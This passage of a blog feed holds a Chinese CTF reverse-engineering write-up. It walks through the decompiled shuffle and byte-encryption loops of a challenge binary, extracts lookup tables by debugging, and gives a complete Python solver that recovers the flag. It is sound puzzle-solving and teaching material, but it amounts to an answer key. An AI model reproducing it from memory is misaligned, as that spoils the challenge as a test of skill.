<p><code>tmp_addr</code> 是用户输入，长度为 64。这整个循环是在按照 <code>dest</code> 中的值来将 <code>tmp_addr</code> 的顺序打乱，而这样的循环一共有 5 个，除了每次复制到 <code>dest</code> 中的值不同以外，代码基本相同。并且复制到 <code>dest</code> 的值是常量，而代码的行为也与用户输入值没有任何关系。也就是说，可以将这 5 次打乱看作一次，我们只需要输入一串已知顺序的 64 字节字符串，然后动调得到输出的字符串，就能得到 64 位对应表，在还原 flag 时直接根据表就能还原。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v58 = <span class="number">0LL</span>;                                  <span class="comment">// exchange end</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v59 = tmp_addr[v58] + <span class="number">1</span>;</span><br><span class="line">      LOWORD(v51) = <span class="number">1</span>;</span><br><span class="line">      LOWORD(v52) = <span class="number">257</span>;</span><br><span class="line">      v60 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v62 = v52;</span><br><span class="line">        LOWORD(v52) = v52 / v59;</span><br><span class="line">        v61 = v62 % v59;</span><br><span class="line">        v63 = v51;</span><br><span class="line">        v51 = v60 - v51 * v52;</span><br><span class="line">        LODWORD(v52) = v59;</span><br><span class="line">        v59 = (v62 % v59);</span><br><span class="line">        v60 = v63;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v61 );</span><br><span class="line">      v64 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v63 &gt; <span class="number">0</span> )</span><br><span class="line">        v64 = v63;</span><br><span class="line">      tmp_addr[v58] = ((v64 + (v63 &gt;&gt; <span class="number">15</span>) - v63) / <span class="number">0x101</span>u + v63 + (v63 &gt;&gt; <span class="number">15</span>) + <span class="number">113</span>) ^ <span class="number">0x89</span>;</span><br><span class="line">      v52 = v58 + <span class="number">1</span>;</span><br><span class="line">      v58 = v52;                                <span class="comment">// v58++</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v52 != <span class="number">64</span> );</span><br></pre></td></tr></table></figure></div>

<p>打乱后是如上的加密，静态分析或动调都可以看出这个加密是以字节为单位的，并且这个加密的运算数似乎也与 flag 的其他位置值没有任何关系。那么有没有可能，我们可以得到一份加密前后的字节对应表，按照表就能将加密后的字节翻译为加密前的字节。</p>
<p>生成 0~255 的 hex 序列，然后就能粘进IDA里提取加密后的值：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>, <span class="number">64</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytearray</span>(<span class="built_in">range</span>(i, i+<span class="number">64</span>)).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure></div>

<p>本来以为就这点，但是拉到后面一看还有个 <code>while ( v8 != 256 );</code> ，而作用范围是刚才的打乱和加密，也就是说这个过程会循环 256 次，问题不大。</p>
<p>得到的字节对应表与还原脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 动调得到的表</span></span><br><span class="line">s0_255 = [<span class="number">0xFB</span>, <span class="number">0x7B</span>, <span class="number">0x4E</span>, <span class="number">0xBB</span>, <span class="number">0x51</span>, <span class="number">0x15</span>, <span class="number">0x8D</span>, <span class="number">0xDB</span>, <span class="number">0xB0</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0x8E</span>, <span class="number">0xAA</span>, <span class="number">0xB2</span>, <span class="number">0x60</span>, <span class="number">0xEB</span>, <span class="number">0x63</span>, <span class="number">0x5C</span>, <span class="number">0xDE</span>, <span class="number">0x42</span>, <span class="number">0x2B</span>, <span class="number">0xC6</span>, <span class="number">0xA6</span>, <span class="number">0x35</span>, <span class="number">0x30</span>, <span class="number">0x43</span>, <span class="number">0xD6</span>, <span class="number">0x5F</span>, <span class="number">0xBD</span>, <span class="number">0x24</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x8C</span>, <span class="number">0xA7</span>, <span class="number">0xD5</span>, <span class="number">0x2A</span>, <span class="number">0x7C</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0x17</span>, <span class="number">0x9D</span>, <span class="number">0x83</span>, <span class="number">0xFE</span>, <span class="number">0x69</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0xA9</span>, <span class="number">0x9E</span>, <span class="number">0x0F</span>, <span class="number">0x1C</span>, <span class="number">0x66</span>, <span class="number">0x97</span>, <span class="number">0x5B</span>, <span class="number">0x61</span>, <span class="number">0xED</span>, <span class="number">0xAD</span>, <span class="number">0xE0</span>, <span class="number">0xDA</span>, <span class="number">0x27</span>, <span class="number">0x06</span>, <span class="number">0x25</span>, <span class="number">0xDC</span>, <span class="number">0x5E</span>, <span class="number">0xE7</span>,</span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0xD2</span>, <span class="number">0xD9</span>, <span class="number">0x8F</span>, <span class="number">0xEE</span>, <span class="number">0xAF</span>, <span class="number">0x03</span>, <span class="number">0x93</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0xE1</span>, <span class="number">0xB3</span>, <span class="number">0xEC</span>, <span class="number">0x81</span>, <span class="number">0x9F</span>, <span class="number">0xCA</span>, <span class="number">0x58</span>, <span class="number">0xB7</span>, <span class="number">0x79</span>, <span class="number">0xFD</span>, <span class="number">0x3B</span>, <span class="number">0xA0</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0xCB</span>, <span class="number">0xA8</span>, <span class="number">0x80</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0x4D</span>, <span class="number">0x2F</span>, <span class="number">0x75</span>, <span class="number">0x71</span>, <span class="number">0x0A</span>, <span class="number">0x04</span>, <span class="number">0x39</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x9C</span>, <span class="number">0xAB</span>, <span class="number">0xEF</span>, <span class="number">0xA4</span>, <span class="number">0xD8</span>, <span class="number">0xE2</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x1E</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x2E</span>, <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0x86</span>, <span class="number">0x74</span>, <span class="number">0x6A</span>, <span class="number">0xC4</span>, <span class="number">0x2D</span>, <span class="number">0x4F</span>, <span class="number">0xF9</span>,</span><br><span class="line">        <span class="number">0xFA</span>, <span class="number">0x94</span>, <span class="number">0xB6</span>, <span class="number">0x1F</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0x5D</span>, <span class="number">0xE8</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0x5A</span>, <span class="number">0x65</span>, <span class="number">0x88</span>, <span class="number">0xC5</span>, <span class="number">0x7F</span>, <span class="number">0x77</span>, <span class="number">0x11</span>, <span class="number">0xCF</span>, <span class="number">0xF1</span>, <span class="number">0x1B</span>, <span class="number">0x3F</span>, <span class="number">0xF4</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x12</span>, <span class="number">0xE4</span>, <span class="number">0xBA</span>, <span class="number">0xDF</span>, <span class="number">0xE9</span>, <span class="number">0x62</span>, <span class="number">0x6E</span>, <span class="number">0xB4</span>, <span class="number">0x96</span>, <span class="number">0xCD</span>, <span class="number">0x13</span>, <span class="number">0x53</span>, <span class="number">0x4B</span>, <span class="number">0x28</span>, <span class="number">0xD7</span>, <span class="number">0xD1</span>, <span class="number">0x33</span>, <span class="number">0xB8</span>, <span class="number">0xE6</span>, <span class="number">0x7A</span>, <span class="number">0x2C</span>, <span class="number">0x9B</span>, <span class="number">0x29</span>, <span class="number">0x44</span>, <span class="number">0x52</span>, <span class="number">0xF7</span>, <span class="number">0x20</span>, <span class="number">0xF2</span>, <span class="number">0x31</span>, <span class="number">0xD3</span>, <span class="number">0xB9</span>, <span class="number">0x40</span>, <span class="number">0xD0</span>, <span class="number">0x34</span>, <span class="number">0xF5</span>, <span class="number">0x54</span>, <span class="number">0x1A</span>, <span class="number">0x01</span>, <span class="number">0xA1</span>, <span class="number">0x92</span>,</span><br><span class="line">        <span class="number">0xFC</span>, <span class="number">0x85</span>, <span class="number">0x07</span>, <span class="number">0xBE</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x19</span>, <span class="number">0xF3</span>, <span class="number">0x36</span>, <span class="number">0xF6</span>, <span class="number">0x72</span>, <span class="number">0x98</span>, <span class="number">0x4C</span>, <span class="number">0x7D</span>, <span class="number">0xC7</span>, <span class="number">0xD4</span>, <span class="number">0x45</span>, <span class="number">0x4A</span>, <span class="number">0x9A</span>, <span class="number">0xC3</span>, <span class="number">0x8A</span>, <span class="number">0xE5</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0xCC</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x67</span>, <span class="number">0xC9</span>, <span class="number">0x0E</span>, <span class="number">0x3C</span>, <span class="number">0x57</span>, <span class="number">0xF0</span>, <span class="number">0x22</span>, <span class="number">0xBF</span>, <span class="number">0x26</span>, <span class="number">0x84</span>, <span class="number">0x0D</span>, <span class="number">0x90</span>, <span class="number">0xA3</span>, <span class="number">0xAE</span>, <span class="number">0x3D</span>, <span class="number">0x1D</span>, <span class="number">0xC8</span>, <span class="number">0x91</span>, <span class="number">0x05</span>, <span class="number">0x87</span>, <span class="number">0x70</span>, <span class="number">0x08</span>, <span class="number">0x73</span>, <span class="number">0x21</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x3E</span>, <span class="number">0x37</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x56</span>, <span class="number">0xCE</span>, <span class="number">0x82</span>, <span class="number">0x38</span>, <span class="number">0x95</span>, <span class="number">0x78</span>, <span class="number">0xF8</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成对应字典</span></span><br><span class="line">crypto_table = <span class="built_in">dict</span>(<span class="built_in">zip</span>(s0_255,<span class="built_in">range</span>(<span class="number">0x100</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆向查表得到原数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data: <span class="built_in">list</span>, table: <span class="built_in">dict</span></span>):</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        tmp.append(table[i])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure></div>

<p>得到顺序表与还原的脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get order table</span></span><br><span class="line">source = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">replaced = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi6D7Jr&#125;espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m&#x27;</span></span><br><span class="line">revsere_table = [] <span class="comment">#index是source在replace中的下标</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> source:</span><br><span class="line">    revsere_table.append(replaced.find(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还原顺序</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_order</span>(<span class="params">data:<span class="built_in">list</span>, table: <span class="built_in">list</span></span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        tmp.append(data[table[i]])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure></div>

<p>256 次就写个 for 循环就行了</p>
<h3 id="程序如何比较"><a href="#程序如何比较" class="headerlink" title="程序如何比较"></a>程序如何比较</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_func_verify_1.jpg.avif"
                     
                ></p>
<p>如图是 256 次循环后的开头代码，这次 <code>memcpy</code> 加载了一块 255 字节的数据到堆中，但不是 <code>dest</code>。经过查看，这个数据又是 opcode</p>
<p>经过调试发现 <code>dest</code> 加载了 64 字节的数据，那么这个数据很有可能是比较数据，直接拿到脚本里去跑，解出来却是乱码。一开始以为脚本写错了，但拿个明文加密的提取的数据去跑，确实是能跑出明文的，说明比对部分还有细节。</p>
<p>在上图中，opcode 的某些部分被修改了，并且与加密后的输入有关，随后我又偶然发现 <code>if</code> 中对索引 <code>[223, 224, 225, 226]</code> 赋的值和 <code>dest</code> 开头的 4 字节一致，但仍然没看出来有什么比较。</p>
<p>继续向后看，发现会读取 TcpStream io 之类的，不然会卡住等待输入，在 nc 那边输点东西就可以继续跑</p>
<p>然后找到了这个函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_func_verify_2.jpg.avif"
                     
                ></p>
<p>我一开始以为这个就是比较函数，但是仔细看发现根本没有比较的操作，而是又是在对 opcode 进行修改操作，并且将 opcode 数据发送到 nc 端，与之前那个 <code>if</code> 里的代码行为一致，应该是编译优化导致的。</p>
<p>看了半天确定这个程序里确实没有任何比较操作，我将目光转向那个 opcode。经过辨认发现 opcode 被修改的值是如下两个地方：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000564D3A41F1FD                 mov     eax, 1015CB52h # 加密的用户输入</span><br><span class="line">.text:0000564D3A41F202                 add     eax, r12d</span><br><span class="line">.text:0000564D3A41F205                 xor     eax, r13d</span><br><span class="line">.text:0000564D3A41F208                 ror     eax, 0Bh</span><br><span class="line">.text:0000564D3A41F20B                 not     eax</span><br><span class="line">.text:0000564D3A41F20D                 xor     eax, r14d</span><br><span class="line">.text:0000564D3A41F210                 cmp     eax, 526851A7h # dest</span><br><span class="line">.text:0000564D3A41F215                 jnz     short loc_564D3A41F21C</span><br></pre></td></tr></table></figure></div>

<p>程序中的行为是取加密后的用户输入与 <code>dest</code> 中的值写入 opcode 这两处，而这个 opcode 也很明显能看出来是在验证。但是这其中 <code>r12 r13 r14</code> 寄存器的值都是未知的，我的猜测是 opcode 前面执行的代码会影响这三个寄存器，使其在运行到此处时为定值。所以我运行了该 opcode，得到三个寄存器的值：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">r12 = 0x0000000464C457F</span><br><span class="line">r13 = 0x0000000746F6F72</span><br><span class="line">r14 = 0x000000031F3831F</span><br></pre></td></tr></table></figure></div>

<p>逆该过程脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 由于需要模拟汇编中的位运算，所以需要使用 numpy 库</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_cmp</span>(<span class="params">x</span>):</span><br><span class="line">    r12 = <span class="number">0x0000000464C457F</span></span><br><span class="line">    r13 = <span class="number">0x0000000746F6F72</span></span><br><span class="line">    r14 = <span class="number">0x000000031F3831F</span></span><br><span class="line"></span><br><span class="line">    x = np.uint32(x)</span><br><span class="line">    x = np.uint32(x ^ r14)</span><br><span class="line">    x = np.uint32(~x)</span><br><span class="line">    x = np.uint32((x &lt;&lt; <span class="number">11</span>) | (x &gt;&gt; (<span class="number">32</span> - <span class="number">11</span>)))</span><br><span class="line">    x = np.uint32(x ^ r13)</span><br><span class="line">    x = np.uint32(x - r12)</span><br><span class="line">    <span class="comment">#print(hex(x))</span></span><br><span class="line">    x = np.int32(x)</span><br><span class="line">    <span class="keyword">return</span> [x &amp; <span class="number">0xff</span>, (x &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>, (x &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>, (x &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>]</span><br></pre></td></tr></table></figure></div>

<p>总的来看，整个程序其实根本没有验证 flag 的正确性，也没有执行这些 opcode，这些 opcode 只是被作为数据发送到了 nc 端</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data: <span class="built_in">list</span>, table: <span class="built_in">dict</span></span>):</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        tmp.append(table[i])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_order</span>(<span class="params">data:<span class="built_in">list</span>, table: <span class="built_in">list</span></span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        tmp.append(data[table[i]])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def de_cmp(x):</span></span><br><span class="line"><span class="string">    r12 = 0x0000000464C457F</span></span><br><span class="line"><span class="string">    r13 = 0x0000000746F6F72</span></span><br><span class="line"><span class="string">    r14 = 0x000000031F3831F</span></span><br><span class="line"><span class="string">    x ^= r14</span></span><br><span class="line"><span class="string">    x = ~x</span></span><br><span class="line"><span class="string">    x = (x &lt;&lt; 11) | (x &gt;&gt; (32 - 11))</span></span><br><span class="line"><span class="string">    x ^= r13</span></span><br><span class="line"><span class="string">    x -= r12</span></span><br><span class="line"><span class="string">    print(hex(x))</span></span><br><span class="line"><span class="string">    return [x &amp; 0xff, (x &amp; 0xff00) &gt;&gt; 8, (x &amp; 0xff0000) &gt;&gt; 16, (x &amp; 0xff000000) &gt;&gt; 24]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_cmp</span>(<span class="params">x</span>):</span><br><span class="line">    r12 = <span class="number">0x0000000464C457F</span></span><br><span class="line">    r13 = <span class="number">0x0000000746F6F72</span></span><br><span class="line">    r14 = <span class="number">0x000000031F3831F</span></span><br><span class="line"></span><br><span class="line">    x = np.uint32(x)</span><br><span class="line">    x = np.uint32(x ^ r14)</span><br><span class="line">    x = np.uint32(~x)</span><br><span class="line">    x = np.uint32((x &lt;&lt; <span class="number">11</span>) | (x &gt;&gt; (<span class="number">32</span> - <span class="number">11</span>)))</span><br><span class="line">    x = np.uint32(x ^ r13)</span><br><span class="line">    x = np.uint32(x - r12)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(x))</span><br><span class="line">    x = np.int32(x)</span><br><span class="line">    <span class="keyword">return</span> [x &amp; <span class="number">0xff</span>, (x &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>, (x &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>, (x &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># get crypto table</span></span><br><span class="line">s0_255 = [<span class="number">0xFB</span>, <span class="number">0x7B</span>, <span class="number">0x4E</span>, <span class="number">0xBB</span>, <span class="number">0x51</span>, <span class="number">0x15</span>, <span class="number">0x8D</span>, <span class="number">0xDB</span>, <span class="number">0xB0</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0x8E</span>, <span class="number">0xAA</span>, <span class="number">0xB2</span>, <span class="number">0x60</span>, <span class="number">0xEB</span>, <span class="number">0x63</span>, <span class="number">0x5C</span>, <span class="number">0xDE</span>, <span class="number">0x42</span>, <span class="number">0x2B</span>, <span class="number">0xC6</span>, <span class="number">0xA6</span>, <span class="number">0x35</span>, <span class="number">0x30</span>, <span class="number">0x43</span>, <span class="number">0xD6</span>, <span class="number">0x5F</span>, <span class="number">0xBD</span>, <span class="number">0x24</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x8C</span>, <span class="number">0xA7</span>, <span class="number">0xD5</span>, <span class="number">0x2A</span>, <span class="number">0x7C</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0x17</span>, <span class="number">0x9D</span>, <span class="number">0x83</span>, <span class="number">0xFE</span>, <span class="number">0x69</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0xA9</span>, <span class="number">0x9E</span>, <span class="number">0x0F</span>, <span class="number">0x1C</span>, <span class="number">0x66</span>, <span class="number">0x97</span>, <span class="number">0x5B</span>, <span class="number">0x61</span>, <span class="number">0xED</span>, <span class="number">0xAD</span>, <span class="number">0xE0</span>, <span class="number">0xDA</span>, <span class="number">0x27</span>, <span class="number">0x06</span>, <span class="number">0x25</span>, <span class="number">0xDC</span>, <span class="number">0x5E</span>, <span class="number">0xE7</span>,</span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0xD2</span>, <span class="number">0xD9</span>, <span class="number">0x8F</span>, <span class="number">0xEE</span>, <span class="number">0xAF</span>, <span class="number">0x03</span>, <span class="number">0x93</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0xE1</span>, <span class="number">0xB3</span>, <span class="number">0xEC</span>, <span class="number">0x81</span>, <span class="number">0x9F</span>, <span class="number">0xCA</span>, <span class="number">0x58</span>, <span class="number">0xB7</span>, <span class="number">0x79</span>, <span class="number">0xFD</span>, <span class="number">0x3B</span>, <span class="number">0xA0</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0xCB</span>, <span class="number">0xA8</span>, <span class="number">0x80</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0x4D</span>, <span class="number">0x2F</span>, <span class="number">0x75</span>, <span class="number">0x71</span>, <span class="number">0x0A</span>, <span class="number">0x04</span>, <span class="number">0x39</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x9C</span>, <span class="number">0xAB</span>, <span class="number">0xEF</span>, <span class="number">0xA4</span>, <span class="number">0xD8</span>, <span class="number">0xE2</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x1E</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x2E</span>, <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0x86</span>, <span class="number">0x74</span>, <span class="number">0x6A</span>, <span class="number">0xC4</span>, <span class="number">0x2D</span>, <span class="number">0x4F</span>, <span class="number">0xF9</span>,</span><br><span class="line">        <span class="number">0xFA</span>, <span class="number">0x94</span>, <span class="number">0xB6</span>, <span class="number">0x1F</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0x5D</span>, <span class="number">0xE8</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0x5A</span>, <span class="number">0x65</span>, <span class="number">0x88</span>, <span class="number">0xC5</span>, <span class="number">0x7F</span>, <span class="number">0x77</span>, <span class="number">0x11</span>, <span class="number">0xCF</span>, <span class="number">0xF1</span>, <span class="number">0x1B</span>, <span class="number">0x3F</span>, <span class="number">0xF4</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x12</span>, <span class="number">0xE4</span>, <span class="number">0xBA</span>, <span class="number">0xDF</span>, <span class="number">0xE9</span>, <span class="number">0x62</span>, <span class="number">0x6E</span>, <span class="number">0xB4</span>, <span class="number">0x96</span>, <span class="number">0xCD</span>, <span class="number">0x13</span>, <span class="number">0x53</span>, <span class="number">0x4B</span>, <span class="number">0x28</span>, <span class="number">0xD7</span>, <span class="number">0xD1</span>, <span class="number">0x33</span>, <span class="number">0xB8</span>, <span class="number">0xE6</span>, <span class="number">0x7A</span>, <span class="number">0x2C</span>, <span class="number">0x9B</span>, <span class="number">0x29</span>, <span class="number">0x44</span>, <span class="number">0x52</span>, <span class="number">0xF7</span>, <span class="number">0x20</span>, <span class="number">0xF2</span>, <span class="number">0x31</span>, <span class="number">0xD3</span>, <span class="number">0xB9</span>, <span class="number">0x40</span>, <span class="number">0xD0</span>, <span class="number">0x34</span>, <span class="number">0xF5</span>, <span class="number">0x54</span>, <span class="number">0x1A</span>, <span class="number">0x01</span>, <span class="number">0xA1</span>, <span class="number">0x92</span>,</span><br><span class="line">        <span class="number">0xFC</span>, <span class="number">0x85</span>, <span class="number">0x07</span>, <span class="number">0xBE</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x19</span>, <span class="number">0xF3</span>, <span class="number">0x36</span>, <span class="number">0xF6</span>, <span class="number">0x72</span>, <span class="number">0x98</span>, <span class="number">0x4C</span>, <span class="number">0x7D</span>, <span class="number">0xC7</span>, <span class="number">0xD4</span>, <span class="number">0x45</span>, <span class="number">0x4A</span>, <span class="number">0x9A</span>, <span class="number">0xC3</span>, <span class="number">0x8A</span>, <span class="number">0xE5</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0xCC</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x67</span>, <span class="number">0xC9</span>, <span class="number">0x0E</span>, <span class="number">0x3C</span>, <span class="number">0x57</span>, <span class="number">0xF0</span>, <span class="number">0x22</span>, <span class="number">0xBF</span>, <span class="number">0x26</span>, <span class="number">0x84</span>, <span class="number">0x0D</span>, <span class="number">0x90</span>, <span class="number">0xA3</span>, <span class="number">0xAE</span>, <span class="number">0x3D</span>, <span class="number">0x1D</span>, <span class="number">0xC8</span>, <span class="number">0x91</span>, <span class="number">0x05</span>, <span class="number">0x87</span>, <span class="number">0x70</span>, <span class="number">0x08</span>, <span class="number">0x73</span>, <span class="number">0x21</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x3E</span>, <span class="number">0x37</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x56</span>, <span class="number">0xCE</span>, <span class="number">0x82</span>, <span class="number">0x38</span>, <span class="number">0x95</span>, <span class="number">0x78</span>, <span class="number">0xF8</span>]</span><br><span class="line"></span><br><span class="line">crypto_table = <span class="built_in">dict</span>(<span class="built_in">zip</span>(s0_255,<span class="built_in">range</span>(<span class="number">0x100</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get order table</span></span><br><span class="line">source = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">replaced = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi6D7Jr&#125;espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m&#x27;</span></span><br><span class="line">revsere_table = [] <span class="comment">#index是source在replace中的下标</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> source:</span><br><span class="line">    revsere_table.append(replaced.find(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(crypto_table)</span></span><br><span class="line"><span class="comment">#print(revsere_table)</span></span><br><span class="line"></span><br><span class="line">cmp_data = [<span class="number">0x526851A7</span>, <span class="number">0x31FF2785</span>, <span class="number">0xC7D28788</span>, <span class="number">0x523F23D3</span>, <span class="number">0xAF1F1055</span>, <span class="number">0x5C94F027</span>, <span class="number">0x797A3FCD</span>, <span class="number">0xE7F02F9F</span>, <span class="number">0x3C86F045</span>, <span class="number">0x6DEAB0F9</span>, <span class="number">0x91F74290</span>, <span class="number">0x7C9A3AED</span>, <span class="number">0xDC846B01</span>, <span class="number">0x0743C86C</span>, <span class="number">0xDFF7085C</span>, <span class="number">0xA4AEE3EB</span>]</span><br><span class="line"></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmp_data:</span><br><span class="line">    tmp+=de_cmp(i)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    tmp = decrypt(tmp, crypto_table)</span><br><span class="line">    tmp = reverse_order(tmp, revsere_table)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> tmp))</span><br></pre></td></tr></table></figure></div>]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Reverse</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>小米路由器登录脚本</title>
    <url>/2023/03/01/miRouterLogin/</url>
